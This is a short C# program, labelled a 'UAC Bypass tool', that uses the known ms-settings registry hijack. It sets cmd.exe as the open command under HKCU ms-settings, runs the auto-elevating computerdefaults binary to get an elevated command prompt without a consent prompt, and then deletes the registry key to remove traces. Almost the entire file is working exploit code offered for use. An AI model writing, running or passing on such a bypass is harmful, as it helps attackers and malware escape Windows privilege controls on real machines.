using System;
using System.Diagnostics;
using System.Threading;

namespace UAC_Bypass_by_UfferTech
{
    internal class Program
    {
        static void Main()
        {
            Console.ForegroundColor = ConsoleColor.Cyan;
            Console.Title = "UAC Bypass tool";
            Console.WriteLine("Setting registry keys.....");


            var p = new Process
            {
                StartInfo = new ProcessStartInfo("cmd.exe", "/c reg add HKCU\\Software\\Classes\\ms-settings\\Shell\\Open\\command /ve /t REG_SZ /d \"cmd.exe\" /f && reg add HKCU\\Software\\Classes\\ms-settings\\Shell\\Open\\command /v DelegateExecute /t REG_SZ /d \"\" /f")
                {
                    UseShellExecute = true,
                    WindowStyle = ProcessWindowStyle.Maximized
                }
            };
            p.Start();
            Thread.Sleep(3000);
            string a = "(";
            string b = ")";
            Console.Write("Starting process....... " + a + "DO NOT CLOSE THIS WINDOW YET!!!!!!!!" + b);

            Process.Start("computerdefaults");
            Thread.Sleep(3000);
            Console.WriteLine("\nCleaning up..........");
            var q = new Process
            {
                StartInfo = new ProcessStartInfo("cmd.exe", "/c reg delete \"HKCU\\Software\\Classes\\ms-settings\\shell\\open\\command\" /f")
                {
                    UseShellExecute = true,
                    WindowStyle = ProcessWindowStyle.Maximized
                }

            };
            q.Start();
            Thread.Sleep(3500);
            Console.WriteLine("\nCleanup complete!\nYou can now use your elevated Command Prompt. Press any key to exit, or close this window.\n");
            Console.ReadKey();
        }
    }
}